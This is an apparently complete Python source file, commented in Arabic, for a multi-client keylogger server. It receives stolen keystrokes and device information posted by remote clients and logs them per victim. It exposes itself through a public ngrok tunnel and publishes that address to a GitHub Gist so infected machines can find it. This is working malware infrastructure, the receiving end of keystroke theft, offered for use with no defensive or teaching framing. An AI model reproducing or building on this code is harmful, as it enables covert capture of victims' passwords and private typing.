import http.server
import socketserver
import threading
import argparse
import os
import re
import json
import urllib.request
import urllib.error
from datetime import datetime

# ────────────────────── تحميل متغيرات البيئة ─────────────────────────────── #
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # python-dotenv غير مثبت — نعتمد على متغيرات النظام مباشرة

# ────────────────────── الإعدادات الافتراضية ─────────────────────────────── #
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 5000
LOG_DIR      = "logs"

# ════════════════════════════════════════════════════════════════════════════
#  التوكنات تُقرأ من ملف .env أو متغيرات البيئة — لا تضعها في الكود مباشرة
# ════════════════════════════════════════════════════════════════════════════
GITHUB_TOKEN  = os.environ.get("GITHUB_TOKEN", "")
GIST_ID       = os.environ.get("GIST_ID", "")
NGROK_TOKEN   = os.environ.get("NGROK_TOKEN", "")
GIST_FILENAME = "server_addr.txt"
# ─────────────────────────────────────────────────────────────────────────── #

def ensure_log_dir() -> None:
    os.makedirs(LOG_DIR, exist_ok=True)

def safe_filename(name: str) -> str:
    name = re.sub(r'[\\/:*?"<>|]', '', name)
    name = name.replace(' ', '_').strip()
    return name or "unknown_device"

def start_ngrok_tunnel(port: int) -> str | None:
    if not NGROK_TOKEN:
        print("[!] NGROK_TOKEN غير مُعدّ في ملف .env")
        return None
    try:
        from pyngrok import ngrok, conf
        conf.get_default().auth_token = NGROK_TOKEN
        
        # تغيير مهم جداً: نستخدم http بدلاً من tcp ليعمل مجاناً دون بطاقة ائتمان
        tunnel = ngrok.connect(port, "http")
        return tunnel.public_url

    except ImportError:
        print("[!] pyngrok غير مثبت — شغّل: pip install pyngrok")
        return None
    except Exception as e:
        print(f"[!] فشل إنشاء نفق ngrok: {e}")
        return None

def update_gist(url: str) -> bool:
    if not GITHUB_TOKEN or not GIST_ID:
        print("[~] Gist غير مُعدٍّ — تخطّي التحديث التلقائي")
        return False

    payload = json.dumps({
        "files": {
            GIST_FILENAME: {
                "content": url
            }
        }
    }).encode("utf-8")

    req = urllib.request.Request(
        url=f"https://api.github.com/gists/{GIST_ID}",
        data=payload,
        method="PATCH"
    )
    req.add_header("Authorization", f"token {GITHUB_TOKEN}")
    req.add_header("Content-Type",  "application/json")
    req.add_header("Accept",        "application/vnd.github+json")

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            if resp.status == 200:
                print(f"[✓] تم تحديث Gist بالعنوان: {url}")
                return True
    except Exception as e:
        print(f"[!] فشل تحديث Gist: {e}")
    return False

# ══════════════════════════════════════════════════════════════════════════════
#  خادم HTTP لاستقبال البيانات
# ══════════════════════════════════════════════════════════════════════════════
class RequestHandler(http.server.BaseHTTPRequestHandler):
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            req_type = data.get("type")
            client_id = safe_filename(data.get("id", "unknown"))
            log_path = os.path.join(LOG_DIR, f"{client_id}.txt")
            
            if req_type == "init":
                info = data.get("info", "")
                with open(log_path, "a", encoding="utf-8") as f:
                    f.write(info + "\n")
                print(info)
                
            elif req_type == "keys":
                keys_data = data.get("data", "")
                if keys_data:
                    with open(log_path, "a", encoding="utf-8") as f:
                        f.write(keys_data + "\n")
                    
                    # طباعة الحركات على الشاشة
                    for line in keys_data.strip().split("\n"):
                        print(f"[{client_id}] {line}")

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
            
        except Exception as e:
            self.send_response(400)
            self.end_headers()
            print(f"[!] خطأ في استقبال البيانات: {e}")

    def log_message(self, format, *args):
        # تعطيل طباعة رسائل http العادية لتنظيف الشاشة
        pass

def start_server(host: str, port: int, use_ngrok: bool = True) -> None:
    ensure_log_dir()

    public_url = None

    if use_ngrok:
        print("[*] إنشاء نفق ngrok العام (HTTP - مجاني بالكامل)...")
        public_url = start_ngrok_tunnel(port)

        if public_url:
            update_gist(public_url)
        else:
            print("[!] تعذّر إنشاء نفق — الخادم يعمل محلياً فقط")

    server_address = (host, port)
    socketserver.TCPServer.allow_reuse_address = True # ✅ إضافة هذا السطر لحل مشكلة Port already in use
    httpd = socketserver.ThreadingTCPServer(server_address, RequestHandler)
    httpd.daemon_threads = True

    print("=" * 60)
    print("  🔑  KEYLOGGER SERVER — MULTI-CLIENT (HTTP VERSION)")
    print("=" * 60)
    print(f"  📡 يستمع محلياً : http://{host}:{port}")
    if public_url:
        print(f"  🌍 العنوان العام : {public_url}")
        print(f"  📋 Gist الرابط  : https://gist.github.com/{GIST_ID}")
    print(f"  📁 مجلد السجلات : {os.path.abspath(LOG_DIR)}/")
    print(f"  🕒 وقت البدء    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("  ⌨  اضغط Ctrl+C للإيقاف")
    print("=" * 60 + "\n")
    print("[*] في انتظار الاتصالات...\n")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] تم إيقاف الخادم.")
    finally:
        httpd.server_close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Keylogger Server — Global Multi-Client HTTP")
    parser.add_argument("--host",       default=DEFAULT_HOST)
    parser.add_argument("--port",       type=int, default=DEFAULT_PORT)
    parser.add_argument("--no-ngrok",   action="store_true", help="تعطيل ngrok (محلي فقط)")
    args = parser.parse_args()

    start_server(host=args.host, port=args.port, use_ngrok=not args.no_ngrok)
